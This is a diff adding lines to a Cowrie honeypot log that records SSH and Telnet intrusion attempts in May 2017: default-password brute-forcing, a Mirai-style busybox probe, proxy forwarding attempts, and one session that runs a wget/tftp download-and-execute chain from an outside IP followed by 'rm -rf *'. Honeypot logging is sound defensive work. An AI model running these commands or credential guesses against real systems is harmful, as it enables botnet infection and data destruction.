@@ -688,3 +688,238 @@
 2017-05-03T21:13:00+0000 [HoneyPotSSHTransport,59607,113.195.145.21] avatar root logging out
 2017-05-03T21:13:00+0000 [HoneyPotSSHTransport,59607,113.195.145.21] connection lost
 2017-05-03T21:13:00+0000 [HoneyPotSSHTransport,59607,113.195.145.21] Connection lost after 3 seconds
+2017-05-03T21:13:10+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 113.195.145.21:30527 (10.8.41.81:2222) [session: c2a78f37]
+2017-05-03T21:13:10+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 144.76.197.58:43458 (10.8.41.81:2222) [session: d3c77438]
+2017-05-03T21:13:10+0000 [HoneyPotSSHTransport,59609,144.76.197.58] Remote SSH version: SSH-2.0-paramiko_1.15.1
+2017-05-03T21:13:10+0000 [HoneyPotSSHTransport,59609,144.76.197.58] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-05-03T21:13:10+0000 [HoneyPotSSHTransport,59609,144.76.197.58] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-05-03T21:13:10+0000 [HoneyPotSSHTransport,59609,144.76.197.58] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-05-03T21:13:10+0000 [HoneyPotSSHTransport,59608,113.195.145.21] Remote SSH version: SSH-2.0-PUTTY
+2017-05-03T21:13:10+0000 [HoneyPotSSHTransport,59608,113.195.145.21] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-05-03T21:13:10+0000 [HoneyPotSSHTransport,59608,113.195.145.21] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-05-03T21:13:10+0000 [HoneyPotSSHTransport,59608,113.195.145.21] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-05-03T21:13:10+0000 [HoneyPotSSHTransport,59609,144.76.197.58] NEW KEYS
+2017-05-03T21:13:10+0000 [HoneyPotSSHTransport,59609,144.76.197.58] starting service 'ssh-userauth'
+2017-05-03T21:13:11+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59609,144.76.197.58] '1111' trying auth 'password'
+2017-05-03T21:13:11+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59609,144.76.197.58] first time for 144.76.197.58, need: 1
+2017-05-03T21:13:11+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59609,144.76.197.58] login attempt: 1
+2017-05-03T21:13:11+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59609,144.76.197.58] login attempt [1111/1111] succeeded
+2017-05-03T21:13:13+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59609,144.76.197.58] '1111' authenticated with 'password'
+2017-05-03T21:13:13+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59609,144.76.197.58] starting service 'ssh-connection'
+2017-05-03T21:13:13+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,59609,144.76.197.58] got channel 'session' request
+2017-05-03T21:13:13+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59609,144.76.197.58] channel open
+2017-05-03T21:13:13+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59609,144.76.197.58] executing command "cd /tmp; wget http://144.76.197.58/hajimeeee.sh; chmod +x hajimeeee.sh; sh hajimeeee.sh; tftp 144.76.197.58 -c get tbin.sh; chmod +x tbin.sh; sh tbin.sh; rm -rf *"
+2017-05-03T21:13:13+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59609,144.76.197.58] Opening TTY Log: log/tty/20170503-211313-d3c77438-0e.log
+2017-05-03T21:13:13+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59609,144.76.197.58] CMD: cd /tmp; wget http://144.76.197.58/hajimeeee.sh; chmod +x hajimeeee.sh; sh hajimeeee.sh; tftp 144.76.197.58 -c get tbin.sh; chmod +x tbin.sh; sh tbin.sh; rm -rf *
+2017-05-03T21:13:13+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59609,144.76.197.58] Command found: cd /tmp
+2017-05-03T21:13:13+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59609,144.76.197.58] Command found: wget http://144.76.197.58/hajimeeee.sh
+2017-05-03T21:13:13+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://144.76.197.58/hajimeeee.sh>
+2017-05-03T21:13:13+0000 [HTTPPageDownloader,client] Downloaded URL (http://144.76.197.58/hajimeeee.sh) with SHA-256 094130fa4a8581e35f5fa43aa3cab97abf1b21add47b99d26996756a597a11a9 to dl/094130fa4a8581e35f5fa43aa3cab97abf1b21add47b99d26996756a597a11a9
+2017-05-03T21:13:13+0000 [HTTPPageDownloader,client] Command found: chmod +x /tmp/hajimeeee.sh
+2017-05-03T21:13:13+0000 [HTTPPageDownloader,client] Command found: sh /tmp/hajimeeee.sh
+2017-05-03T21:13:13+0000 [HTTPPageDownloader,client] Command found: tftp 144.76.197.58 -c get tbin.sh
+2017-05-03T21:13:13+0000 [HTTPPageDownloader,client] Command found: chmod +x tbin.sh
+2017-05-03T21:13:13+0000 [HTTPPageDownloader,client] Command found: sh tbin.sh
+2017-05-03T21:13:13+0000 [HTTPPageDownloader,client] Command found: rm -rf /tmp/.X11-unix /tmp/.ICE-unix /tmp/hajimeeee.sh
+2017-05-03T21:13:13+0000 [HTTPPageDownloader,client] exitCode: 0
+2017-05-03T21:13:13+0000 [HTTPPageDownloader,client] sending request 'exit-status'
+2017-05-03T21:13:13+0000 [HTTPPageDownloader,client] Not storing duplicate content 094130fa4a8581e35f5fa43aa3cab97abf1b21add47b99d26996756a597a11a9
+2017-05-03T21:13:13+0000 [HTTPPageDownloader,client] Saved redir contents with SHA-256 094130fa4a8581e35f5fa43aa3cab97abf1b21add47b99d26996756a597a11a9 to dl/094130fa4a8581e35f5fa43aa3cab97abf1b21add47b99d26996756a597a11a9
+2017-05-03T21:13:13+0000 [HTTPPageDownloader,client] Closing TTY Log: log/tty/20170503-211313-d3c77438-0e.log after 0 seconds
+2017-05-03T21:13:13+0000 [HTTPPageDownloader,client] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-05-03T21:13:13+0000 [HTTPPageDownloader,client] sending close 0
+2017-05-03T21:13:13+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://144.76.197.58/hajimeeee.sh>
+2017-05-03T21:13:13+0000 [CowrieTelnetTransport,40133,107.172.131.242] Connection lost after 46 seconds
+2017-05-03T21:13:13+0000 [HoneyPotSSHTransport,59609,144.76.197.58] avatar 1111 logging out
+2017-05-03T21:13:13+0000 [HoneyPotSSHTransport,59609,144.76.197.58] connection lost
+2017-05-03T21:13:13+0000 [HoneyPotSSHTransport,59609,144.76.197.58] Connection lost after 3 seconds
+2017-05-03T21:13:13+0000 [HoneyPotSSHTransport,59608,113.195.145.21] NEW KEYS
+2017-05-03T21:13:14+0000 [HoneyPotSSHTransport,59608,113.195.145.21] starting service 'ssh-userauth'
+2017-05-03T21:13:14+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59608,113.195.145.21] 'root' trying auth 'none'
+2017-05-03T21:13:16+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59608,113.195.145.21] 'root' authenticated with 'none'
+2017-05-03T21:13:16+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59608,113.195.145.21] starting service 'ssh-connection'
+2017-05-03T21:13:16+0000 [HoneyPotSSHTransport,59608,113.195.145.21] Got remote error, code 11
+	reason: 
+2017-05-03T21:13:16+0000 [HoneyPotSSHTransport,59608,113.195.145.21] avatar root logging out
+2017-05-03T21:13:16+0000 [HoneyPotSSHTransport,59608,113.195.145.21] connection lost
+2017-05-03T21:13:16+0000 [HoneyPotSSHTransport,59608,113.195.145.21] Connection lost after 6 seconds
+2017-05-03T21:13:18+0000 [CowrieTelnetTransport,40134,107.172.131.242] Connection lost after 38 seconds
+2017-05-03T21:13:22+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 27.56.188.98:43100 (10.8.41.81:2222) [session: 832dee09]
+2017-05-03T21:13:22+0000 [HoneyPotSSHTransport,59610,27.56.188.98] Remote SSH version: SSH-2.0-sshlib-0.1
+2017-05-03T21:13:22+0000 [HoneyPotSSHTransport,59610,27.56.188.98] kex alg, key alg: 'diffie-hellman-group1-sha1' 'ssh-dss'
+2017-05-03T21:13:22+0000 [HoneyPotSSHTransport,59610,27.56.188.98] outgoing: 'aes128-cbc' 'hmac-md5' 'none'
+2017-05-03T21:13:22+0000 [HoneyPotSSHTransport,59610,27.56.188.98] incoming: 'aes128-cbc' 'hmac-md5' 'none'
+2017-05-03T21:13:23+0000 [HoneyPotSSHTransport,59610,27.56.188.98] NEW KEYS
+2017-05-03T21:13:23+0000 [HoneyPotSSHTransport,59610,27.56.188.98] starting service 'ssh-userauth'
+2017-05-03T21:13:23+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59610,27.56.188.98] 'root' trying auth 'password'
+2017-05-03T21:13:23+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59610,27.56.188.98] first time for 27.56.188.98, need: 1
+2017-05-03T21:13:23+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59610,27.56.188.98] login attempt: 1
+2017-05-03T21:13:24+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59610,27.56.188.98] login attempt [root/111111] succeeded
+2017-05-03T21:13:25+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59610,27.56.188.98] 'root' authenticated with 'password'
+2017-05-03T21:13:25+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59610,27.56.188.98] starting service 'ssh-connection'
+2017-05-03T21:13:26+0000 [HoneyPotSSHTransport,59610,27.56.188.98] avatar root logging out
+2017-05-03T21:13:26+0000 [HoneyPotSSHTransport,59610,27.56.188.98] connection lost
+2017-05-03T21:13:26+0000 [HoneyPotSSHTransport,59610,27.56.188.98] Connection lost after 4 seconds
+2017-05-03T21:13:27+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 195.22.127.83:46315 (10.8.41.81:2222) [session: 0eefb62e]
+2017-05-03T21:13:27+0000 [HoneyPotSSHTransport,59611,195.22.127.83] Remote SSH version: SSH-2.0-sshlib-0.2
+2017-05-03T21:13:27+0000 [HoneyPotSSHTransport,59611,195.22.127.83] kex alg, key alg: 'diffie-hellman-group1-sha1' 'ssh-dss'
+2017-05-03T21:13:27+0000 [HoneyPotSSHTransport,59611,195.22.127.83] outgoing: 'aes128-cbc' 'hmac-md5' 'none'
+2017-05-03T21:13:27+0000 [HoneyPotSSHTransport,59611,195.22.127.83] incoming: 'aes128-cbc' 'hmac-md5' 'none'
+2017-05-03T21:13:27+0000 [HoneyPotSSHTransport,59611,195.22.127.83] NEW KEYS
+2017-05-03T21:13:28+0000 [HoneyPotSSHTransport,59611,195.22.127.83] starting service 'ssh-userauth'
+2017-05-03T21:13:28+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] 'root' trying auth 'password'
+2017-05-03T21:13:28+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login attempt: 12356
+2017-05-03T21:13:28+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login return, expect: [support/support]
+2017-05-03T21:13:28+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login attempt [root/111111] failed
+2017-05-03T21:13:29+0000 [-] 'root' failed auth 'password'
+2017-05-03T21:13:29+0000 [-] unauthorized login: 
+2017-05-03T21:13:29+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] 'root' trying auth 'password'
+2017-05-03T21:13:30+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login attempt: 12357
+2017-05-03T21:13:30+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login return, expect: [support/support]
+2017-05-03T21:13:30+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login attempt [root/111111] failed
+2017-05-03T21:13:31+0000 [-] 'root' failed auth 'password'
+2017-05-03T21:13:31+0000 [-] unauthorized login: 
+2017-05-03T21:13:31+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] 'root' trying auth 'password'
+2017-05-03T21:13:31+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login attempt: 12358
+2017-05-03T21:13:31+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login return, expect: [support/support]
+2017-05-03T21:13:32+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login attempt [root/111111] failed
+2017-05-03T21:13:32+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 113.195.145.21:13544 (10.8.41.81:2222) [session: 6aef58b7]
+2017-05-03T21:13:32+0000 [HoneyPotSSHTransport,59612,113.195.145.21] Remote SSH version: SSH-2.0-PUTTY
+2017-05-03T21:13:32+0000 [HoneyPotSSHTransport,59612,113.195.145.21] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-05-03T21:13:32+0000 [HoneyPotSSHTransport,59612,113.195.145.21] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-05-03T21:13:32+0000 [HoneyPotSSHTransport,59612,113.195.145.21] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-05-03T21:13:33+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,59573,91.230.47.81] got channel 'direct-tcpip' request
+2017-05-03T21:13:33+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,59573,91.230.47.81] direct-tcp connection request to 188.214.134.13:8888 from localhost:5556
+2017-05-03T21:13:33+0000 [SSHChannel None (1) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59573,91.230.47.81] direct-tcp forward to 188.214.134.13:8888 with data 'GET /v3/callerinfo/?geo=true HTTP/1.1\r\nHost: 188.214.134.13:8888\r\nConnection: Keep-Alive\r\nUser-Agent: Apache-HttpClient/4.5.1 (Java/1.8.0_66)\r\nAccept-Encoding: gzip,deflate\r\n\r\n'
+2017-05-03T21:13:33+0000 [SSHChannel None (1) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59573,91.230.47.81] failed to connect: Connection refused
+2017-05-03T21:13:33+0000 [SSHChannel None (1) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59573,91.230.47.81] sending close 1
+2017-05-03T21:13:33+0000 [-] 'root' failed auth 'password'
+2017-05-03T21:13:33+0000 [-] unauthorized login: 
+2017-05-03T21:13:33+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] 'root' trying auth 'password'
+2017-05-03T21:13:33+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login attempt: 12359
+2017-05-03T21:13:33+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login return, expect: [support/support]
+2017-05-03T21:13:34+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login attempt [root/111111] failed
+2017-05-03T21:13:34+0000 [HoneyPotSSHTransport,59612,113.195.145.21] NEW KEYS
+2017-05-03T21:13:34+0000 [HoneyPotSSHTransport,59612,113.195.145.21] starting service 'ssh-userauth'
+2017-05-03T21:13:34+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,59573,91.230.47.81] got channel 'direct-tcpip' request
+2017-05-03T21:13:34+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,59573,91.230.47.81] direct-tcp connection request to 188.214.134.13:8888 from localhost:5556
+2017-05-03T21:13:34+0000 [SSHChannel None (2) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59573,91.230.47.81] direct-tcp forward to 188.214.134.13:8888 with data 'GET /v3/callerinfo/?geo=true HTTP/1.1\r\nHost: 188.214.134.13:8888\r\nConnection: Keep-Alive\r\nUser-Agent: Apache-HttpClient/4.5.1 (Java/1.8.0_66)\r\nAccept-Encoding: gzip,deflate\r\n\r\n'
+2017-05-03T21:13:34+0000 [SSHChannel None (2) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59573,91.230.47.81] failed to connect: Connection refused
+2017-05-03T21:13:34+0000 [SSHChannel None (2) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59573,91.230.47.81] sending close 2
+2017-05-03T21:13:34+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59612,113.195.145.21] 'root' trying auth 'none'
+2017-05-03T21:13:36+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59612,113.195.145.21] 'root' authenticated with 'none'
+2017-05-03T21:13:36+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59612,113.195.145.21] starting service 'ssh-connection'
+2017-05-03T21:13:36+0000 [-] 'root' failed auth 'password'
+2017-05-03T21:13:36+0000 [-] unauthorized login: 
+2017-05-03T21:13:36+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,59573,91.230.47.81] got channel 'direct-tcpip' request
+2017-05-03T21:13:36+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,59573,91.230.47.81] direct-tcp connection request to 188.214.134.13:8888 from localhost:5556
+2017-05-03T21:13:36+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 189.160.255.118:60074 (10.8.41.81:2223) [session: TT40135]
+2017-05-03T21:13:36+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] 'root' trying auth 'password'
+2017-05-03T21:13:36+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login attempt: 12360
+2017-05-03T21:13:36+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login return, expect: [support/support]
+2017-05-03T21:13:36+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login attempt [root/111111] failed
+2017-05-03T21:13:36+0000 [SSHChannel None (3) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59573,91.230.47.81] direct-tcp forward to 188.214.134.13:8888 with data 'GET /v3/callerinfo/?geo=true HTTP/1.1\r\nHost: 188.214.134.13:8888\r\nConnection: Keep-Alive\r\nUser-Agent: Apache-HttpClient/4.5.1 (Java/1.8.0_66)\r\nAccept-Encoding: gzip,deflate\r\n\r\n'
+2017-05-03T21:13:36+0000 [SSHChannel None (3) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59573,91.230.47.81] failed to connect: Connection refused
+2017-05-03T21:13:36+0000 [SSHChannel None (3) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59573,91.230.47.81] sending close 3
+2017-05-03T21:13:36+0000 [HoneyPotSSHTransport,59612,113.195.145.21] Got remote error, code 11
+	reason: 
+2017-05-03T21:13:36+0000 [HoneyPotSSHTransport,59612,113.195.145.21] avatar root logging out
+2017-05-03T21:13:36+0000 [HoneyPotSSHTransport,59612,113.195.145.21] connection lost
+2017-05-03T21:13:37+0000 [HoneyPotSSHTransport,59612,113.195.145.21] Connection lost after 4 seconds
+2017-05-03T21:13:37+0000 [CowrieTelnetTransport,40135,189.160.255.118] first time for 189.160.255.118, need: 1
+2017-05-03T21:13:37+0000 [CowrieTelnetTransport,40135,189.160.255.118] login attempt: 1
+2017-05-03T21:13:38+0000 [CowrieTelnetTransport,40135,189.160.255.118] login attempt [admin/1111111] succeeded
+2017-05-03T21:13:39+0000 [CowrieTelnetTransport,40135,189.160.255.118] Opening TTY Log: log/tty/20170503-211339-None-40135i.log
+2017-05-03T21:13:39+0000 [CowrieTelnetTransport,40135,189.160.255.118] Warning: state changed and new state returned
+2017-05-03T21:13:39+0000 [-] 'root' failed auth 'password'
+2017-05-03T21:13:39+0000 [-] unauthorized login: 
+2017-05-03T21:13:39+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,59573,91.230.47.81] got channel 'direct-tcpip' request
+2017-05-03T21:13:39+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,59573,91.230.47.81] direct-tcp connection request to 188.214.134.13:8888 from localhost:5556
+2017-05-03T21:13:39+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] 'root' trying auth 'password'
+2017-05-03T21:13:40+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login attempt: 12361
+2017-05-03T21:13:40+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login return, expect: [support/support]
+2017-05-03T21:13:40+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login attempt [root/111111] failed
+2017-05-03T21:13:40+0000 [CowrieTelnetTransport,40135,189.160.255.118] Received unhandled keyID: '\x00'
+2017-05-03T21:13:40+0000 [CowrieTelnetTransport,40135,189.160.255.118] CMD: enable
+2017-05-03T21:13:40+0000 [CowrieTelnetTransport,40135,189.160.255.118] Command found: enable 
+2017-05-03T21:13:40+0000 [CowrieTelnetTransport,40135,189.160.255.118] Reading txtcmd from "txtcmds/bin/enable"
+2017-05-03T21:13:40+0000 [SSHChannel None (4) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59573,91.230.47.81] direct-tcp forward to 188.214.134.13:8888 with data 'GET /v3/callerinfo/?geo=true HTTP/1.1\r\nHost: 188.214.134.13:8888\r\nConnection: Keep-Alive\r\nUser-Agent: Apache-HttpClient/4.5.1 (Java/1.8.0_66)\r\nAccept-Encoding: gzip,deflate\r\n\r\n'
+2017-05-03T21:13:40+0000 [SSHChannel None (4) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59573,91.230.47.81] failed to connect: Connection refused
+2017-05-03T21:13:40+0000 [SSHChannel None (4) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59573,91.230.47.81] sending close 4
+2017-05-03T21:13:40+0000 [CowrieTelnetTransport,40135,189.160.255.118] Received unhandled keyID: '\x00'
+2017-05-03T21:13:41+0000 [CowrieTelnetTransport,40135,189.160.255.118] CMD: system
+2017-05-03T21:13:41+0000 [CowrieTelnetTransport,40135,189.160.255.118] Command not found: system
+2017-05-03T21:13:41+0000 [CowrieTelnetTransport,40135,189.160.255.118] Received unhandled keyID: '\x00'
+2017-05-03T21:13:41+0000 [CowrieTelnetTransport,40135,189.160.255.118] CMD: shell
+2017-05-03T21:13:41+0000 [CowrieTelnetTransport,40135,189.160.255.118] Command not found: shell
+2017-05-03T21:13:41+0000 [CowrieTelnetTransport,40135,189.160.255.118] Received unhandled keyID: '\x00'
+2017-05-03T21:13:41+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,59573,91.230.47.81] got channel 'direct-tcpip' request
+2017-05-03T21:13:41+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,59573,91.230.47.81] direct-tcp connection request to 188.214.134.13:8888 from localhost:5556
+2017-05-03T21:13:41+0000 [CowrieTelnetTransport,40135,189.160.255.118] CMD: sh
+2017-05-03T21:13:41+0000 [CowrieTelnetTransport,40135,189.160.255.118] Command found: sh 
+2017-05-03T21:13:41+0000 [SSHChannel None (5) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59573,91.230.47.81] direct-tcp forward to 188.214.134.13:8888 with data 'GET /v3/callerinfo/?geo=true HTTP/1.1\r\nHost: 188.214.134.13:8888\r\nConnection: Keep-Alive\r\nUser-Agent: Apache-HttpClient/4.5.1 (Java/1.8.0_66)\r\nAccept-Encoding: gzip,deflate\r\n\r\n'
+2017-05-03T21:13:41+0000 [SSHChannel None (5) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59573,91.230.47.81] failed to connect: Connection refused
+2017-05-03T21:13:41+0000 [SSHChannel None (5) on SSHService 'ssh-connection' on HoneyPotSSHTransport,59573,91.230.47.81] sending close 5
+2017-05-03T21:13:41+0000 [-] 'root' failed auth 'password'
+2017-05-03T21:13:41+0000 [-] unauthorized login: 
+2017-05-03T21:13:41+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] 'root' trying auth 'password'
+2017-05-03T21:13:41+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login attempt: 12362
+2017-05-03T21:13:41+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login return, expect: [support/support]
+2017-05-03T21:13:42+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login attempt [root/111111] failed
+2017-05-03T21:13:42+0000 [CowrieTelnetTransport,40135,189.160.255.118] Received unhandled keyID: '\x00'
+2017-05-03T21:13:42+0000 [CowrieTelnetTransport,40135,189.160.255.118] CMD: /bin/busybox MIRAI
+2017-05-03T21:13:42+0000 [CowrieTelnetTransport,40135,189.160.255.118] Command found: /bin/busybox MIRAI
+2017-05-03T21:13:43+0000 [-] 'root' failed auth 'password'
+2017-05-03T21:13:43+0000 [-] unauthorized login: 
+2017-05-03T21:13:43+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] 'root' trying auth 'password'
+2017-05-03T21:13:46+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login attempt: 12363
+2017-05-03T21:13:46+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login return, expect: [support/support]
+2017-05-03T21:13:46+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login attempt [root/111111] failed
+2017-05-03T21:13:47+0000 [-] 'root' failed auth 'password'
+2017-05-03T21:13:47+0000 [-] unauthorized login: 
+2017-05-03T21:13:47+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] 'root' trying auth 'password'
+2017-05-03T21:13:47+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login attempt: 12364
+2017-05-03T21:13:47+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login return, expect: [support/support]
+2017-05-03T21:13:48+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login attempt [root/111111] failed
+2017-05-03T21:13:49+0000 [-] 'root' failed auth 'password'
+2017-05-03T21:13:49+0000 [-] unauthorized login: 
+2017-05-03T21:13:49+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] 'root' trying auth 'password'
+2017-05-03T21:13:49+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login attempt: 12365
+2017-05-03T21:13:49+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login return, expect: [support/support]
+2017-05-03T21:13:50+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login attempt [root/111111] failed
+2017-05-03T21:13:51+0000 [-] 'root' failed auth 'password'
+2017-05-03T21:13:51+0000 [-] unauthorized login: 
+2017-05-03T21:13:51+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] 'root' trying auth 'password'
+2017-05-03T21:13:51+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login attempt: 12366
+2017-05-03T21:13:51+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login return, expect: [support/support]
+2017-05-03T21:13:52+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login attempt [root/111111] failed
+2017-05-03T21:13:53+0000 [-] 'root' failed auth 'password'
+2017-05-03T21:13:53+0000 [-] unauthorized login: 
+2017-05-03T21:13:53+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] 'root' trying auth 'password'
+2017-05-03T21:13:53+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login attempt: 12367
+2017-05-03T21:13:53+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login return, expect: [support/support]
+2017-05-03T21:13:54+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login attempt [root/111111] failed
+2017-05-03T21:13:55+0000 [-] 'root' failed auth 'password'
+2017-05-03T21:13:55+0000 [-] unauthorized login: 
+2017-05-03T21:13:55+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] 'root' trying auth 'password'
+2017-05-03T21:13:55+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login attempt: 12368
+2017-05-03T21:13:55+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login return, expect: [support/support]
+2017-05-03T21:13:55+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login attempt [root/111111] failed
+2017-05-03T21:13:56+0000 [-] 'root' failed auth 'password'
+2017-05-03T21:13:56+0000 [-] unauthorized login: 
+2017-05-03T21:13:56+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] 'root' trying auth 'password'
+2017-05-03T21:13:57+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login attempt: 12369
+2017-05-03T21:13:57+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,59611,195.22.127.83] login return, expect: [support/support]
